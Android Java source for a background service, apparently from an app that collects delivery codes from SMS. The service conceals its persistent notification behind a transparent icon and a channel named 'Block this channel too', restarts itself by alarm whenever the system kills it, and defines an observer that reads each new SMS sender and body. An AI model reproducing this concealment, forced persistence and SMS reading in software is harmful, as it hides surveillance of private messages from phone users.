package android.iocl.dac_collector.Services;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.iocl.dac_collector.R;
import android.iocl.dac_collector.Receivers.MyReceiver;
import android.iocl.dac_collector.SyncAdapters.SyncUtils;
import android.iocl.dac_collector.Ui.MainActivity;
import android.iocl.dac_collector.Utility.NotificationHelper;
import android.iocl.dac_collector.Utility.Utility;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.work.Data;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.WorkRequest;

public class FixOppoAutoKill extends Service {
    private static final String CHANNEL_ID = "fix_oppo_channel";
    private static final String CHANNEL_NAME = "Block this channel too";
    private static final String TAG = "FixOppoAutoKill";
    private static final int NOTIFICATION_ID = 1;

    private MyReceiver myReceiver;
    private boolean isReceiverRegistered = false;
    private SmsObserver smsObserver;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            createNotificationChannel();
            Notification notification = createNotification();
            Log.d(TAG, "Calling startForeground with notification");
            startForeground(NOTIFICATION_ID, notification);

            SyncUtils.initialize(getApplicationContext());
            JobSchedulerUtil.fetch_profile_info(getApplicationContext());
        } catch (Exception e) {
            Log.e(TAG, "Error during service creation", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            if (!isReceiverRegistered) {
                myReceiver = new MyReceiver();
                IntentFilter filter = new IntentFilter(Intent.ACTION_USER_PRESENT);
                registerReceiver(myReceiver, filter);
                isReceiverRegistered = true;
                Log.d(TAG, "Receiver registered");
            } else {
                Log.d(TAG, "Receiver already registered, skipping");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to register receiver", e);
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            scheduleServiceRestart();
        } catch (Exception e) {
            Log.e(TAG, "Failed to schedule service restart", e);
        }

        try {
            if (isReceiverRegistered && myReceiver != null) {
                unregisterReceiver(myReceiver);
                isReceiverRegistered = false;
                Log.d(TAG, "Receiver unregistered");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to unregister receiver", e);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void scheduleServiceRestart() {
        try {
            Intent intent = new Intent(this, MyReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    this, 0, intent, PendingIntent.FLAG_IMMUTABLE);

            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (alarmManager != null) {
                long triggerAt = System.currentTimeMillis() + 10000; // 10 seconds
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
                } else {
                    alarmManager.set(
                            AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Alarm scheduling failed", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(
                        CHANNEL_ID,
                        CHANNEL_NAME,
                        NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription("Keeps the background service alive");
                channel.enableLights(false);
                channel.enableVibration(false);
                channel.setSound(null, null);

                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(channel);
                }
            } catch (Exception e) {
                Log.e(TAG, "Notification channel creation failed", e);
            }
        }
    }

    private Notification createNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, intent, PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Service Running")
                .setContentText("Keeping app alive")
                .setSmallIcon(R.drawable.transparent_1px) // must exist
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setSilent(true)
                .build();
    }

    private void setupSmsObserver() {
        try {
            Uri smsUri = Uri.parse("content://sms/inbox");
            smsObserver = new SmsObserver(new Handler());
            getContentResolver().registerContentObserver(smsUri, true, smsObserver);
        } catch (Exception e) {
            Log.e(TAG, "SMS observer setup failed", e);
        }
    }

    private class SmsObserver extends ContentObserver {
        public SmsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            try {
                readNewSms();
            } catch (Exception e) {
                Log.e("SmsObserver", "Error in SMS observer change", e);
            }
        }

        private void readNewSms() {
            Cursor cursor = null;
            try {
                cursor = getContentResolver().query(
                        Uri.parse("content://sms/inbox"),
                        new String[]{"address", "body", "date"},
                        null,
                        null,
                        "date DESC LIMIT 1"
                );
                if (cursor != null && cursor.moveToFirst()) {
                    int addressIndex = cursor.getColumnIndex("address");
                    int bodyIndex = cursor.getColumnIndex("body");

                    if (addressIndex >= 0 && bodyIndex >= 0) {
                        String sender = cursor.getString(addressIndex);
                        String message = cursor.getString(bodyIndex);
                        showSmsToast(sender, message);
                    } else {
                        Log.e("SMSReader", "Missing column indexes");
                    }
                }
            } catch (Exception e) {
                Log.e("SmsObserver", "Failed to read SMS", e);
            } finally {
                if (cursor != null) {
                    try {
                        cursor.close();
                    } catch (Exception ignored) {}
                }
            }
        }

        private void showSmsToast(String sender, String message) {
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        boolean isPosted = NotificationHelper.isNotificationActive(
                                getApplicationContext(), Utility.NOTIFICATION_ID);

                        if (!isPosted) {
                            Data data = new Data.Builder()
                                    .putString("sender", sender)
                                    .putString("body", message)
                                    .build();

                            WorkRequest request = new OneTimeWorkRequest.Builder(SmsWorker.class)
                                    .setInputData(data)
                                    .build();

                            WorkManager.getInstance(getApplicationContext()).enqueue(request);
                        } else {
                            Log.d(TAG, "Notification already posted, ignoring");
                        }
                    }
                } catch (Exception e) {
                    Log.e("SmsObserver", "Error posting SMS toast", e);
                }
            }, 2000);
        }
    }
}
